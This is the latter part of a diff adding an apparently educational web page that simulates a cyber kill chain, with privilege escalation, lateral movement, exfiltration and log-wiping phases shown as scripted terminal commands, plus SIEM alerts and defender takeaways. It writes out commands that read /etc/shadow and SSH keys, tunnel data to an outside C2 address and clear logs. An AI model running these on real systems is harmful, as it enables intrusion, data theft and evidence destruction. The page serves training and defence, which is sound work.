+            { type: "output", text: "Starting LinPEAS v2.3.0...\n\n[+] Interesting SUID binaries:\n  /usr/bin/find (GNU findutils 4.8.0)\n  /usr/bin/vim.basic\n  /usr/bin/python3.10\n\n[+] Sudo rules:\n  (ALL : ALL) ALL  ← j.smith can run ANY command as root\n\n[+] Capabilities:\n  /usr/bin/ping  cap_net_raw=ep\n\n[+] Cron jobs:\n  * * * * * root /opt/backup.sh\n  - /opt/backup.sh is WORLD-WRITABLE\n\n[+] Kernel info:\n  Linux 5.15.0-76-generic — CVE-2023-32233 (netfilter) applicable\n\n[+] Docker:\n  j.smith is in the 'docker' group" },
+            { type: "separator" },
+            { type: "cmd", text: "sudo su -" },
+            { type: "output", text: "root@webserver:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@webserver:~# whoami\nroot" },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# cat /etc/shadow | head -5" },
+            { type: "output", text: "root:$6$rounds=656000$salt...$hash...:19500:0:99999:7:::\ndaemon:*:19470:0:99999:7:::\nbin:*:19470:0:99999:7:::\nsys:*:19470:0:99999:7:::\nj.smith:$6$rounds=656000$salt2...$hash2...:19500:0:99999:7:::" },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# cat /root/.ssh/id_rsa" },
+            { type: "output", text: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACD8examplekeymaterialhereforillustrationpurposesonlyAAAAAj8example\nkeymaterialcontinuedheredoNOTusethisisfakeAAAAEcm9vdEB3ZWJzZXJ2ZXItdGFyZ2V0\nY29ycC5jb20BAgMEBQYHCAkKCwwNDg8=\n-----END OPENSSH PRIVATE KEY-----" },
+            { type: "success", text: ">>> ROOT ACCESS ACHIEVED — Full system compromise on webserver (203.0.113.10)" }
+        ],
+        alerts: [
+            { severity: "critical", msg: "CRITICAL: Privilege escalation to root via sudo — user j.smith had unrestricted sudo access" },
+            { severity: "critical", msg: "CRITICAL: /etc/shadow dumped — all local password hashes extracted" },
+            { severity: "high", msg: "HIGH: Root SSH private key harvested — can be used to pivot to other systems" },
+            { severity: "high", msg: "HIGH: Writable cron job /opt/backup.sh — alternative privesc vector available" },
+            { severity: "medium", msg: "MEDIUM: Kernel CVE-2023-32233 applicable — unexploited but viable escalation path" }
+        ]
+    },
+    {
+        id: 5,
+        name: "Lateral Movement",
+        desc: "Moving through the network to other systems",
+        icon: "fa-arrows-split-up-and-left",
+        color: "purple",
+        overview: "With root access on the initial target, the attacker explores the internal network to identify and compromise additional systems. This involves scanning internal subnets, using harvested credentials and SSH keys to authenticate to other servers, exploiting trust relationships, and establishing persistence on newly compromised hosts.",
+        objectives: [
+            "Scan the internal network (10.0.0.0/24) for additional hosts and services",
+            "Use harvested SSH keys and credentials to pivot to database and backup servers",
+            "Exploit internal trust relationships and password reuse",
+            "Establish persistence mechanisms on compromised internal systems"
+        ],
+        tools: ["ProxyChains", "Chisel", "CrackMapExec", "BloodHound", "Rubeus", "Impacket"],
+        network: { attacker: true, arrow1: true, target: true, arrow2: true, internal: true, arrow3: true, exfil: false },
+        terminal: [
+            { type: "cmd", text: "root@webserver:~# nmap -sn 10.0.0.0/24" },
+            { type: "output", text: "Nmap scan report for 10.0.0.1\n  Host is up (0.001ms latency)\nNmap scan report for 10.0.0.10\n  Host is up (0.002ms latency) — webserver.targetcorp.com\nNmap scan report for 10.0.0.15\n  Host is up (0.003ms latency) — db-primary.targetcorp.com\nNmap scan report for 10.0.0.20\n  Host is up (0.004ms latency) — proxy.targetcorp.com\nNmap scan report for 10.0.0.25\n  Host is up (0.005ms latency) — fileserver.targetcorp.com\nNmap scan report for 10.0.0.30\n  Host is up (0.003ms latency) — dc01.targetcorp.com (AD Domain Controller)\n\nNmap done: 256 IP addresses (6 hosts up)" },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# ssh -i /root/.ssh/id_rsa root@10.0.0.15" },
+            { type: "output", text: "root@db-primary:~# hostname\ndb-primary.targetcorp.com\nroot@db-primary:~# mysql -u root -e 'SHOW DATABASES;'\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| targetcorp_wp      |\n| hr_payroll         |\n| customer_data      |\n| internal_docs      |\n+--------------------+" },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# crackmapexec smb 10.0.0.0/24 -u j.smith -p 'SmithPass!99'" },
+            { type: "output", text: "10.0.0.30:445  SMB    dc01          [*] Windows Server 2022 (name:DC01) (domain:targetcorp.local)\n10.0.0.30:445  SMB    dc01          [+] targetcorp.local\\j.smith:SmithPass!99 \n10.0.0.25:445  SMB    fileserver    [*] Windows Server 2019 (name:FILESERV01)\n10.0.0.25:445  SMB    fileserver    [+] targetcorp.local\\j.smith:SmithPass!99 \n10.0.0.20:445  SMB    proxy         [*] Ubuntu 22.04 (name:proxy)\n10.0.0.15:445  SMB    db-primary    [*] Linux (name:db-primary)\n\nPwned 3/6 hosts with j.smith credentials" },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# ssh -i /root/.ssh/id_rsa root@10.0.0.25" },
+            { type: "output", text: "root@fileserver:~# ls -la /shared/\ndrwxrwxrwx  2 root root 4096 Jun 10 14:22 contracts/\ndrwxrwxrwx  2 root root 4096 Jun 12 09:30 financial_reports/\ndrwxrwx---  2 root root 4096 Jun 08 16:45 employee_records/\n-rw-r--r--  1 root root 2048 Jun 11 11:00 credentials_backup.csv\nroot@fileserver:~# wc -l /shared/credentials_backup.csv\n247 /shared/credentials_backup.csv" },
+            { type: "success", text: ">>> LATERAL MOVEMENT COMPLETE — 3 additional systems compromised, 247 credentials stolen" }
+        ],
+        alerts: [
+            { severity: "critical", msg: "CRITICAL: Lateral movement — same credentials (j.smith) authenticated to 3 internal systems via SMB" },
+            { severity: "critical", msg: "CRITICAL: Database server 10.0.0.15 compromised — hr_payroll & customer_data databases accessible" },
+            { severity: "high", msg: "HIGH: File server 10.0.0.25 breached — credentials_backup.csv with 247 entries stolen" },
+            { severity: "high", msg: "HIGH: Active Directory Domain Controller (10.0.0.30) accessible with compromised credentials" },
+            { severity: "medium", msg: "MEDIUM: Internal network fully mapped — 6 hosts discovered on 10.0.0.0/24" }
+        ]
+    },
+    {
+        id: 6,
+        name: "Data Exfiltration",
+        desc: "Extracting sensitive data from compromised systems",
+        icon: "fa-file-export",
+        color: "red",
+        overview: "The attacker identifies and collects high-value data from compromised systems — customer databases, financial records, employee information, intellectual property, and credentials. The data is then staged, compressed, encrypted, and transferred out of the victim network through covert channels to avoid detection by network monitoring tools.",
+        objectives: [
+            "Identify and inventory high-value data across all compromised systems",
+            "Stage collected data to a central location for efficient extraction",
+            "Compress and encrypt the data package to avoid IDS/IPS detection",
+            "Exfiltrate through covert channels (DNS tunneling, HTTPS, or steganography)"
+        ],
+        tools: ["Rsync", "7-Zip", "GPG", "DNSExfiltrator", "Chisel", "Steghide"],
+        network: { attacker: true, arrow1: true, target: true, arrow2: true, internal: true, arrow3: true, exfil: true },
+        terminal: [
+            { type: "cmd", text: "root@db-primary:~# mysqldump -u root --all-databases > /tmp/all_databases.sql" },
+            { type: "output", text: "-- Dumping all databases...\n-- Database: targetcorp_wp\n-- Database: hr_payroll\n-- Database: customer_data\n-- Database: internal_docs\n\nDump completed. Size: 4.7 GB" },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# mkdir -p /tmp/exfil/stage && cd /tmp/exfil/stage" },
+            { type: "cmd", text: "root@webserver:~# cp /shared/credentials_backup.csv . && cp /shared/financial_reports/* . && cp /shared/employee_records/* ." },
+            { type: "cmd", text: "root@webserver:~# scp root@10.0.0.15:/tmp/all_databases.sql ." },
+            { type: "output", text: "all_databases.sql        100%  4.7GB  48.2MB/s   01:38\ncredentials_backup.csv  100%   42KB  42.1KB/s   00:00\nfinancial_reports/      100%  890MB  12.4MB/s   01:12\nemployee_records/       100%  156MB  15.8MB/s   00:10" },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# tar czf /tmp/exfil/payload.tar.gz -C /tmp/exfil/stage . && ls -lh /tmp/exfil/payload.tar.gz" },
+            { type: "output", text: "-rw-r--r-- 1 root root 3.2G Jun 12 22:47 /tmp/exfil/payload.tar.gz" },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# gpg --batch --yes --passphrase 'ExfilP@ss!2024' -c /tmp/exfil/payload.tar.gz" },
+            { type: "output", text: "gpg: AES256.CFB encrypted data created: /tmp/exfil/payload.tar.gz.gpg (3.2 GB)" },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# chisel client --auth 'exfil:chans3cret' 198.51.100.42:8080 R:9999:socks &" },
+            { type: "cmd", text: "root@webserver:~# proxychains4 -q scp /tmp/exfil/payload.tar.gz.gpg exfil@198.51.100.42:/data/drops/" },
+            { type: "output", text: "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/libproxychains4.so\n[proxychains] DLL init: proxychains-ng 4.16\npayload.tar.gz.gpg    100%  3.2GB  22.1MB/s   02:26\n\nTransfer complete." },
+            { type: "success", text: ">>> DATA EXFILTRATION COMPLETE — 3.2 GB encrypted payload transferred to C2 server" }
+        ],
+        alerts: [
+            { severity: "critical", msg: "CRITICAL: Mass database dump detected — 4.7 GB of all databases exported from db-primary" },
+            { severity: "critical", msg: "CRITICAL: Large encrypted file transfer outbound — 3.2 GB via proxy tunnel to external IP" },
+            { severity: "high", msg: "HIGH: Covert tunnel established via Chisel on port 8080 — bypasses firewall egress rules" },
+            { severity: "high", msg: "HIGH: Sensitive file staging — financial reports (890 MB), employee records (156 MB), 247 credentials collected" },
+            { severity: "medium", msg: "MEDIUM: Unusual data aggregation pattern — multiple file copies from different shares to single staging directory" }
+        ]
+    },
+    {
+        id: 7,
+        name: "Covering Tracks",
+        desc: "Erasing evidence of the intrusion",
+        icon: "fa-eraser",
+        color: "yellow",
+        overview: "Before withdrawing, the attacker systematically removes all evidence of their presence. This includes clearing log files, removing created accounts and backdoors, deleting shell history, eliminating temporary files, and restoring modified configurations to their original state to delay or prevent incident response detection.",
+        objectives: [
+            "Clear all system and application log files on compromised hosts",
+            "Remove created user accounts, SSH keys, and cron jobs",
+            "Delete shell history, temporary files, and staged exfiltration data",
+            "Restore modified configurations and remove persistence mechanisms"
+        ],
+        tools: ["Logrotate", "Histsweep", "Shred", "Tmpwatch", "Auditctl", "Custom Scripts"],
+        network: { attacker: true, arrow1: false, target: false, arrow2: false, internal: false, arrow3: false, exfil: false },
+        terminal: [
+            { type: "cmd", text: "root@webserver:~# for host in 10.0.0.10 10.0.0.15 10.0.0.25; do ssh root@$host 'echo \"\" > /var/log/auth.log; echo \"\" > /var/log/syslog; echo \"\" > /var/log/apache2/access.log; echo \"\" > /var/log/apache2/error.log'; done" },
+            { type: "output", text: "[webserver]    Logs cleared.\n[db-primary]   Logs cleared.\n[fileserver]   Logs cleared." },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# for host in 10.0.0.10 10.0.0.15 10.0.0.25; do ssh root@$host 'cat /dev/null > ~/.bash_history; history -c; rm -rf /tmp/exfil /tmp/all_databases.sql /tmp/db_dump.sql /tmp/config.php.bak'; done" },
+            { type: "output", text: "[webserver]    History & temp files purged.\n[db-primary]   History & temp files purged.\n[fileserver]   History & temp files purged." },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# for host in 10.0.0.10 10.0.0.15 10.0.0.25; do ssh root@$host 'crontab -r 2>/dev/null; rm -f /opt/backdoor.sh /tmp/.hidden_shell 2>/dev/null; chattr -i /opt/backup.sh 2>/dev/null'; done" },
+            { type: "output", text: "[webserver]    Persistence removed.\n[db-primary]   Persistence removed.\n[fileserver]   Persistence removed." },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# shred -vfzu -n 5 /tmp/payload.tar.gz 2>/dev/null; shred -vfzu -n 5 /tmp/payload.tar.gz.gpg 2>/dev/null" },
+            { type: "output", text: "shred: /tmp/payload.tar.gz: pass 1/5 (random)...shred: /tmp/payload.tar.gz: pass 2/5 (random)...shred: /tmp/payload.tar.gz: pass 5/5 (random)...removed\nshred: /tmp/payload.tar.gz.gpg: pass 1/5 (random)...shred: /tmp/payload.tar.gz.gpg: pass 5/5 (random)...removed" },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# kill $(pgrep chisel); rm -f /usr/local/bin/chisel; iptables -F OUTPUT -t nat 2>/dev/null" },
+            { type: "output", text: "Tunnel processes terminated.\nChisel binary removed.\nNAT rules flushed." },
+            { type: "separator" },
+            { type: "cmd", text: "root@webserver:~# for host in 10.0.0.10 10.0.0.15 10.0.0.25; do ssh root@$host 'lastlog -u attacker_acc 2>/dev/null && userdel -r attacker_acc 2>/dev/null; echo \"Cleaned: $host\"'; done" },
+            { type: "output", text: "Cleaned: webserver\nCleaned: db-primary\nCleaned: fileserver" },
+            { type: "success", text: ">>> TRACKS COVERED — All evidence of intrusion removed from 3 compromised systems" }
+        ],
+        alerts: [
+            { severity: "medium", msg: "WARNING: Log files on webserver appear to have been abruptly truncated — possible tampering" },
+            { severity: "medium", msg: "WARNING: Shell history files empty on multiple servers — inconsistent with normal admin activity" },
+            { severity: "low", msg: "INFO: /usr/local/bin/chisel binary no longer present on webserver" },
+            { severity: "low", msg: "INFO: Gap in audit log continuity detected on 3 internal hosts" }
+        ]
+    }
+];
+
+// ============================================================
+// STATE
+// ============================================================
+let currentPhase = 0;
+let isRunning = false;
+let terminalQueue = [];
+let alertQueue = [];
+let typingInterval = null;
+
+// ============================================================
+// INIT
+// ============================================================
+function initLab() {
+    renderSidebar();
+    renderPhase(0);
+}
+
+// ============================================================
+// SIDEBAR
+// ============================================================
+function renderSidebar() {
+    const sb = document.getElementById('sidebar');
+    let html = '<div class="sidebar-label">Attack Phases</div>';
+    PHASES.forEach((p, i) => {
+        let cls = '';
+        if (i === currentPhase) cls = 'active';
+        else if (i < currentPhase) cls = 'done';
+        html += `
+            <div class="phase-item ${cls}" onclick="goToPhase(${i})" id="phase-item-${i}">
+                <div class="phase-num">${i < currentPhase ? '<i class="fas fa-check" style="font-size:0.65rem"></i>' : (i + 1)}</div>
+                <div class="phase-info">
+                    <div class="phase-name">${p.name}</div>
+                    <div class="phase-desc">${p.desc}</div>
+                </div>
+            </div>
+        `;
+    });
+    const pct = Math.round((currentPhase / PHASES.length) * 100);
+    html += `
+        <div class="sidebar-progress">
+            <div class="progress-label"><span>Progress</span><span id="progressPct">${pct}%</span></div>
+            <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill" style="width:${pct}%"></div></div>
+        </div>
+    `;
+    sb.innerHTML = html;
+}
+
+// ============================================================
+// RENDER PHASE CONTENT
+// ============================================================
+function renderPhase(idx) {
+    const p = PHASES[idx];
+    const area = document.getElementById('contentArea');
+
+    // Network nodes
+    const n = p.network;
+    const nodeHTML = `
+        <div class="network-nodes">
+            <div class="net-node">
+                <div class="net-node-icon attacker ${n.attacker ? (n.arrow1 ? 'pulsing' : '') : ''}"><i class="fas fa-skull-crossbones"></i></div>
+                <div class="net-node-label">Attacker</div>
+                <div class="net-node-ip">198.51.100.42</div>
+            </div>
+            <div class="net-arrow ${n.arrow1 ? 'active' : ''}"><i class="fas fa-long-arrow-alt-right"></i></div>
+            <div class="net-node">
+                <div class="net-node-icon target ${n.target ? 'pulsing' : ''}"><i class="fas fa-server"></i></div>
+                <div class="net-node-label">Web Server</div>
+                <div class="net-node-ip">203.0.113.10</div>
+            </div>
+            <div class="net-arrow ${n.arrow2 ? 'active' : ''}"><i class="fas fa-long-arrow-alt-right"></i></div>
+            <div class="net-node">
+                <div class="net-node-icon internal ${n.internal ? 'pulsing' : ''}"><i class="fas fa-network-wired"></i></div>
+                <div class="net-node-label">Internal Net</div>
+                <div class="net-node-ip">10.0.0.0/24</div>
+            </div>
+            <div class="net-arrow ${n.arrow3 ? 'active' : ''}"><i class="fas fa-long-arrow-alt-right"></i></div>
+            <div class="net-node">
+                <div class="net-node-icon exfil ${n.exfil ? 'pulsing' : ''}"><i class="fas fa-cloud-arrow-down"></i></div>
+                <div class="net-node-label">Exfil Point</div>
+                <div class="net-node-ip">C2 Server</div>
+            </div>
+        </div>
+    `;
+
+    // Objectives list
+    const objHTML = p.objectives.map(o => `<li>${o}</li>`).join('');
+
+    // Tools pills
+    const toolsHTML = p.tools.map(t => `<span class="tool-pill">${t}</span>`).join('');
+
+    const isLast = idx === PHASES.length - 1;
+    const isComplete = idx < currentPhase;
+
+    area.innerHTML = `
+        <div class="phase-header">
+            <div class="phase-header-num"><i class="fas ${p.icon}"></i> Phase ${p.id} of ${PHASES.length}</div>
+            <h2>${p.name}</h2>
+            <p>${p.overview}</p>
+        </div>
+
+        <div class="phase-complete-banner ${isComplete ? 'show' : ''}" id="phaseBanner">
+            <i class="fas fa-circle-check"></i>
+            <span>Phase completed — all objectives achieved</span>
+        </div>
+
+        <!-- Network Topology -->
+        <div class="network-viz">
+            <div class="network-title"><i class="fas fa-diagram-project"></i> Network Topology — Phase ${p.id}</div>
+            ${nodeHTML}
+        </div>
+
+        <!-- Objectives -->
+        <div class="info-card">
+            <div class="info-card-header">
+                <div class="info-card-icon green"><i class="fas fa-bullseye"></i></div>
+                <div class="info-card-title">Objectives</div>
+            </div>
+            <ul>${objHTML}</ul>
+        </div>
+
+        <!-- Tools -->
+        <div class="info-card">
+            <div class="info-card-header">
+                <div class="info-card-icon cyan"><i class="fas fa-wrench"></i></div>
+                <div class="info-card-title">Tools Used in This Phase</div>
+            </div>
+            <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:4px;">
+                <style>.tool-pill{display:inline-block;padding:5px 12px;border-radius:6px;font-size:0.78rem;font-weight:600;background:var(--cyan-dim);color:var(--cyan);border:1px solid rgba(0,212,255,0.2);font-family:var(--mono);}</style>
+                ${toolsHTML}
+            </div>
+        </div>
+
+        <!-- Terminal -->
+        <div class="terminal-wrapper">
+            <div class="terminal-bar">
+                <div style="display:flex;align-items:center;gap:12px;">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <div class="terminal-tab">attacker@kali:~</div>
+                </div>
+                <div class="terminal-actions">
+                    <button class="terminal-btn" onclick="clearTerminal()">Clear</button>
+                    <button class="terminal-btn run" id="btnRun" onclick="runPhaseTerminal()">
+                        <i class="fas fa-play"></i> Run
+                    </button>
+                </div>
+            </div>
+            <div class="terminal-body" id="terminalBody">
+                <div class="t-line t-output"># Phase ${p.id}: ${p.name}</div>
+                <div class="t-line t-output"># Click "Run" to start the simulation...</div>
+                <div class="t-line"><span class="cursor-blink" id="cursor"></span></div>
+            </div>
+        </div>
+
+        <!-- Alert Log -->
+        <div class="alert-log">
+            <div class="alert-log-header">
+                <div class="alert-log-title"><i class="fas fa-bell"></i> SIEM Alert Log</div>
+                <span class="alert-log-count critical" id="alertCount">0 alerts</span>
+            </div>
+            <div class="alert-log-body" id="alertLogBody">
+                <div class="alert-entry">
+                    <span class="alert-time">--:--:--</span>
+                    <span class="alert-severity low">INFO</span>
+                    <span class="alert-msg">Monitoring active — waiting for phase execution...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Next Button -->
+        <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap;">
+            <button class="btn-next-phase" id="btnNext" onclick="nextPhase()" disabled>
+                ${isLast ? '<i class="fas fa-flag-checkered"></i> Complete Simulation' : '<i class="fas fa-arrow-right"></i> Next Phase'}
+            </button>
+            <span style="font-size:0.8rem;color:var(--fg-dim);" id="nextHint">Run the terminal simulation first to unlock the next phase.</span>
+        </div>
+    `;
+}
+
+// ============================================================
+// TERMINAL ENGINE
+// ============================================================
+function runPhaseTerminal() {
+    if (isRunning) return;
+    isRunning = true;
+
+    const p = PHASES[currentPhase];
+    terminalQueue = [...p.terminal];
+    alertQueue = [...p.alerts];
+
+    // Update status
+    const badge = document.getElementById('statusBadge');
+    badge.className = 'status-badge running';
+    document.getElementById('statusText').textContent = 'Phase ' + p.id + ' Running';
+
+    // Disable run button
+    document.getElementById('btnRun').disabled = true;
+    document.getElementById('btnRun').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Running';
+
+    // Clear terminal
+    const tb = document.getElementById('terminalBody');
+    tb.innerHTML = `<div class="t-line t-output"># Phase ${p.id}: ${p.name} — Simulation started</div>`;
+    document.getElementById('alertLogBody').innerHTML = '';
+
+    processTerminalQueue();
+}
+
+function processTerminalQueue() {
+    if (terminalQueue.length === 0) {
+        finishPhase();
+        return;
+    }
+
+    const item = terminalQueue.shift();
+    const tb = document.getElementById('terminalBody');
+
+    // Remove cursor
+    const cursor = document.getElementById('cursor');
+    if (cursor) cursor.remove();
+
+    if (item.type === 'separator') {
+        const sep = document.createElement('div');
+        sep.className = 't-line t-separator';
+        sep.textContent = '─'.repeat(60);
+        tb.appendChild(sep);
+        tb.scrollTop = tb.scrollHeight;
+        setTimeout(processTerminalQueue, 150);
+        return;
+    }
+
+    if (item.type === 'success') {
+        const line = document.createElement('div');
+        line.className = 't-line t-success';
+        line.textContent = item.text;
+        tb.appendChild(line);
+        tb.scrollTop = tb.scrollHeight;
+        setTimeout(processTerminalQueue, 400);
+        return;
+    }
+
+    if (item.type === 'cmd') {
+        const line = document.createElement('div');
+        line.className = 't-line';
+        line.innerHTML = `<span class="t-prompt">attacker@kali</span><span class="t-output">:</span><span class="t-highlight">~</span><span class="t-output">$ </span><span class="t-cmd" id="typing-target"></span><span class="cursor-blink"></span>`;
+        tb.appendChild(line);
+        tb.scrollTop = tb.scrollHeight;
+
+        const target = document.getElementById('typing-target');
+        typeText(target, item.text, () => {
+            setTimeout(processTerminalQueue, 300);
+        });
+    } else {
+        // Output — type it out line by line
+        const lines = item.text.split('\n');
+        let lineIdx = 0;
+        function nextLine() {
+            if (lineIdx >= lines.length) {
+                setTimeout(processTerminalQueue, 200);
+                return;
+            }
+            const line = document.createElement('div');
+            line.className = 't-line t-output';
+            line.textContent = lines[lineIdx];
+            tb.appendChild(line);
+            tb.scrollTop = tb.scrollHeight;
+            lineIdx++;
+            setTimeout(nextLine, 30 + Math.random() * 20);
+        }
+        nextLine();
+    }
+}
+
+function typeText(el, text, cb) {
+    let i = 0;
+    clearInterval(typingInterval);
+    typingInterval = setInterval(() => {
+        if (i >= text.length) {
+            clearInterval(typingInterval);
+            // Remove cursor after typing
+            const cursors = el.parentElement.querySelectorAll('.cursor-blink');
+            cursors.forEach(c => {
+                const newC = document.createElement('span');
+                newC.className = 'cursor-blink';
+                el.parentElement.appendChild(newC);
+                c.remove();
+            });
+            if (cb) cb();
+            return;
+        }
+        el.textContent += text[i];
+        i++;
+        // Scroll terminal
+        const tb = document.getElementById('terminalBody');
+        tb.scrollTop = tb.scrollHeight;
+    }, 25 + Math.random() * 25);
+}
+
+function clearTerminal() {
+    const tb = document.getElementById('terminalBody');
+    tb.innerHTML = '<div class="t-line t-output"># Terminal cleared</div><div class="t-line"><span class="cursor-blink"></span></div>';
+}
+
+// ============================================================
+// ALERT ENGINE
+// ============================================================
+function processAlertQueue() {
+    if (alertQueue.length === 0) return;
+    const alert = alertQueue.shift();
+    const body = document.getElementById('alertLogBody');
+    const now = new Date();
+    const time = now.toTimeString().slice(0, 8);
+
+    const entry = document.createElement('div');
+    entry.className = 'alert-entry';
+    entry.innerHTML = `
+        <span class="alert-time">${time}</span>
+        <span class="alert-severity ${alert.severity}">${alert.severity}</span>
+        <span class="alert-msg">${alert.msg}</span>
+    `;
+    body.appendChild(entry);
+    body.scrollTop = body.scrollHeight;
+
+    // Update count
+    const count = body.querySelectorAll('.alert-entry').length;
+    const countEl = document.getElementById('alertCount');
+    countEl.textContent = count + ' alert' + (count !== 1 ? 's' : '');
+
+    if (alertQueue.length > 0) {
+        setTimeout(processAlertQueue, 1500 + Math.random() * 1500);
+    }
+}
+
+// ============================================================
+// PHASE COMPLETION
+// ============================================================
+function finishPhase() {
+    isRunning = false;
+
+    const p = PHASES[currentPhase];
+    const badge = document.getElementById('statusBadge');
+    badge.className = 'status-badge complete';
+    document.getElementById('statusText').textContent = 'Phase ' + p.id + ' Complete';
+
+    // Show banner
+    document.getElementById('phaseBanner').classList.add('show');
+
+    // Enable next button
+    document.getElementById('btnNext').disabled = false;
+    document.getElementById('nextHint').textContent = 'Phase simulation complete. Proceed to the next phase.';
+
+    // Start alert queue
+    setTimeout(processAlertQueue, 500);
+}
+
+// ============================================================
+// NAVIGATION
+// ============================================================
+function nextPhase() {
+    if (isRunning) return;
+    if (currentPhase >= PHASES.length - 1) {
+        // All phases done
+        showFinalReport();
+        return;
+    }
+    currentPhase++;
+    renderSidebar();
+    renderPhase(currentPhase);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function goToPhase(idx) {
+    if (isRunning) return;
+    if (idx > currentPhase) return; // Can't skip ahead
+    currentPhase = idx;
+    renderSidebar();
+    renderPhase(currentPhase);
+}
+
+function showFinalReport() {
+    const area = document.getElementById('contentArea');
+    const badge = document.getElementById('statusBadge');
+    badge.className = 'status-badge complete';
+    document.getElementById('statusText').textContent = 'Simulation Complete';
+
+    // Update progress
+    document.getElementById('progressPct').textContent = '100%';
+    document.getElementById('progressFill').style.width = '100%';
+
+    area.innerHTML = `
+        <div style="text-align:center;padding:60px 20px;">
+            <div style="width:80px;height:80px;border-radius:50%;background:var(--accent-dim);border:2px solid var(--accent-mid);display:inline-flex;align-items:center;justify-content:center;font-size:2rem;color:var(--accent);margin-bottom:24px;">
+                <i class="fas fa-flag-checkered"></i>
+            </div>
+            <h2 style="font-size:2rem;font-weight:800;color:var(--fg-bright);margin-bottom:12px;">Attack Simulation Complete</h2>
+            <p style="font-size:1rem;color:var(--fg-dim);max-width:600px;margin:0 auto 40px;line-height:1.7;">
+                All 7 phases of the cyber kill chain have been successfully simulated. The attacker achieved full network compromise, exfiltrated 3.2 GB of sensitive data, and covered their tracks across 4 systems.
+            </p>
+        </div>
+
+        <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;max-width:800px;margin:0 auto 40px;">
+            <div class="info-card" style="text-align:center;">
+                <div style="font-size:2rem;font-weight:800;color:var(--red);font-family:var(--mono);">4</div>
+                <div style="font-size:0.78rem;color:var(--fg-dim);margin-top:4px;">Systems Compromised</div>
+            </div>
+            <div class="info-card" style="text-align:center;">
+                <div style="font-size:2rem;font-weight:800;color:var(--orange);font-family:var(--mono);">247</div>
+                <div style="font-size:0.78rem;color:var(--fg-dim);margin-top:4px;">Credentials Stolen</div>
+            </div>
+            <div class="info-card" style="text-align:center;">
+                <div style="font-size:2rem;font-weight:800;color:var(--cyan);font-family:var(--mono);">3.2 GB</div>
+                <div style="font-size:0.78rem;color:var(--fg-dim);margin-top:4px;">Data Exfiltrated</div>
+            </div>
+            <div class="info-card" style="text-align:center;">
+                <div style="font-size:2rem;font-weight:800;color:var(--yellow);font-family:var(--mono);">27</div>
+                <div style="font-size:0.78rem;color:var(--fg-dim);margin-top:4px;">SIEM Alerts Generated</div>
+            </div>
+        </div>
+
+        <div class="info-card" style="max-width:800px;margin:0 auto 24px;">
+            <div class="info-card-header">
+                <div class="info-card-icon red"><i class="fas fa-triangle-exclamation"></i></div>
+                <div class="info-card-title">Key Takeaways for Defenders</div>
+            </div>
+            <ul>
+                <li>Database dumps and config backups should NEVER be accessible from the web root — implement proper access controls and WAF rules</li>
+                <li>Password reuse across services allowed single-credential lateral movement — enforce unique passwords and MFA everywhere</li>
+                <li>Unrestricted sudo access is a critical misconfiguration — use principle of least privilege for sudo rules</li>
+                <li>Log centralization with immutable storage (WORM) would have detected the log clearing in Phase 7</li>
+                <li>Network segmentation between web servers, databases, and file servers would have limited lateral movement scope</li>
+                <li>Egress filtering on the firewall would have blocked the covert tunnel and large outbound data transfers</li>
+                <li>Regular credential rotation and checking for leaked credentials in public sources would have reduced the attack surface</li>
+            </ul>
+        </div>
+
+        <div style="text-align:center;">
+            <button class="btn-next-phase" onclick="resetLab()">
+                <i class="fas fa-rotate-left"></i> Restart Simulation
+            </button>
+        </div>
+    `;
+}
+
+// ============================================================
+// RESET
+// ============================================================
+function resetLab() {
+    clearInterval(typingInterval);
+    isRunning = false;
+    currentPhase = 0;
+    terminalQueue = [];
+    alertQueue = [];
+
+    const badge = document.getElementById('statusBadge');
+    badge.className = 'status-badge idle';
+    document.getElementById('statusText').textContent = 'Ready';
+
+    renderSidebar();
+    renderPhase(0);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// ============================================================
+// BOOT
+// ============================================================
+document.addEventListener('DOMContentLoaded', initLab);
+</script>
+</body>
+</html>
